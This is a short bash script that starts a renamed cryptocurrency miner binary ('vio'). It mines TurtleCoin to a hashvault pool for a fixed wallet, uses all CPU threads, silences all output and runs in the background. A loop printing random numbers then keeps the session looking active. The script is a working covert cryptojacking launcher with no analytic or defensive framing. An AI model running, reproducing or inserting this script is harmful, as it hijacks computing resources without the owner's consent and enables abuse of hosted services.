#!/bin/bash
chmod u+x vio
./vio --donate-level 1 -a Argon2/Chukwa -o frankfurt01.hashvault.pro:80 -u TRTLuyhTSuu5cKEs7mgBwVXEAvh4uJyUNfG6CskYPw998yHNL6UrraV2XoBTtkjL4NRh7Uo9qyN6qBQePU2gAa7vdL9MsCFCULN -p $(cat /proc/sys/kernel/hostname) -t$(nproc --all) >/dev/null &while :; do shuf -n 1 -i 1-99999999; sleep 30; done >/dev/null >/dev/null 2>&1
